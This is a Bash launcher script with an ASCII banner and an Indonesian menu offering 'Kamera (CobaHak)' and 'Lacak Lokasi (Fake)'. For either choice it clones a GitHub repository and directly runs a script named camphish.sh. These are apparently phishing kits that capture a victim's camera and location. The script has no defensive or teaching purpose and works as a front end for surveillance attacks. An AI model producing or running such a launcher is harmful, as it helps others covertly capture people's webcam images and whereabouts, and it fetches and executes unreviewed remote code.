#!/bin/bash

banner() {
    clear
    local user_name=$(whoami)
    local time_now=$(date +"%Y-%m-%d %H:%M:%S")
    
    echo -e "\e[1;92m====================================================\e[0m"
    echo -e "\e[1;96m"
    echo "██╗   ██╗ █████╗ ███╗   ██╗"
    echo "██║   ██║██╔══██╗████╗  ██║"
    echo "██║   ██║███████║██╔██╗ ██║"
    echo "╚██╗ ██╔╝██╔══██║██║╚██╗██║"
    echo " ╚████╔╝ ██║  ██║██║ ╚████║"
    echo "  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝"
    echo -e "\e[0m"
    echo -e "\e[1;93m                  ✦✦✦   YAN   ✦✦✦\e[0m"
    echo -e "\e[1;95m                       Adrian\e[0m"
    echo -e "\e[1;92m====================================================\e[0m"
    echo ""
    echo -e "\e[1;36mUser       : \e[0m$user_name"
    echo -e "\e[1;36mWaktu      : \e[0m$time_now"
    echo -e "\e[1;36mPilih fitur yang ingin dijalankan:\e[0m"
    echo ""
    echo -e "\e[1;33m[1] Kamera (CobaHak)\e[0m"
    echo -e "\e[1;33m[2] Lacak Lokasi (Fake)\e[0m"
    echo ""

    read -p "Masukkan pilihan [1/2]: " option
    option="${option:-1}"

    # Konfirmasi sebelum menjalankan
    read -p "Kamu yakin ingin menjalankan pilihan ini? (y/n): " confirm
    if [[ $confirm != [yY] ]]; then
        echo -e "\e[1;91m[!] Dibatalkan oleh user. Keluar...\e[0m"
        exit 0
    fi

    case $option in
        1)
            echo -e "\e[1;92m[*] Mengunduh & menjalankan CobaHak (Kamera)...\e[0m"
            git clone https://github.com/adrian020w/CobaHak.git
            cd CobaHak
            bash camphish.sh
            ;;
        2)
            echo -e "\e[1;92m[*] Mengunduh & menjalankan Fake (Lacak Lokasi)...\e[0m"
            git clone https://github.com/umbrahabreh-arch/fake.git
            cd fake
            bash camphish.sh
            ;;
        *)
            echo -e "\e[1;91m[!] Pilihan tidak valid. Keluar...\e[0m"
            exit 1
            ;;
    esac
}

# Jalankan banner
banner
